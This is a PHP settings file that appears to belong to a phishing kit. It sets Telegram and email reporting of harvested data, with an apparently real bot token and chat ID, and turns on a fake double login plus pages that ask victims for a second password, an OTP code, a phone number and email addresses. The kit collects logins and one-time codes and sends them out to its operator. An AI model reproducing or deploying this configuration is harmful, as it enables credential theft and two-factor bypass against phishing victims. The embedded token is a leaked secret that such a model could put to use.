<?php
$settings = array(


	//Telegram @teesofficial

	"nickname"		        => "Spammer",				//Put your name here Makanaki

	"telegram"			=> "1",							//Use 1 to on and 0 to off telegram reporting

	"chat_id"			=> "5600855926",					//Put your telegram chat id

	"bot_url"			=> "bot5906671765:AAGnxtTREIcB44amta7h21C84VvYKB4BCDI", //Put your telegram bot url starting with "bot"

	"send_mail"		        => "1",						//Use 1 to on and 0 to off email reporting

	"email"			        => "yourmail@yandex.com",		//Put your email here, yandex.com email recommended

	"Relogin"		        => "1",								//Use 1 to on and 0 to off double login

	"ShowSecondPassword"				=> "1",					//Use 1 to on and 0 to off Second Password Page

	"Display_OTP"				=> "1",					//Use 1 to on and 0 to off otp Page

	"Shownum"				=> "1",					//Use 1 to on and 0 to off number request Page

	"Showemail"				=> "1",					//Use 1 to on and 0 to off number request Page

	"Showdouble_email"				=> "1",					//Use 1 to on and 0 to off number request Page


);
return $settings;
?>	